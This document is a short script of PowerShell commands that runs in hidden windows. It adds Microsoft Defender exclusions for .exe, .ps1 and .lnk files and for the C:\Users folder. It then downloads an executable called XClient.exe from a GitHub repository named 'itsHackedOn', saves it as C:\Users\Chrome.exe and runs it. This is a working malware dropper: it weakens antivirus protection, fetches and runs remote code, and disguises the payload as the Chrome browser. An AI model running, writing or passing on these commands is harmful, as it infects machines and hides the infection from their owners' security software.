powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"


powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/itsHackedOn/Powershell/raw/main/XClient.exe -o C:\Users\Chrome.exe
powershell.exe -w Hidden C:\Users\Chrome.exe

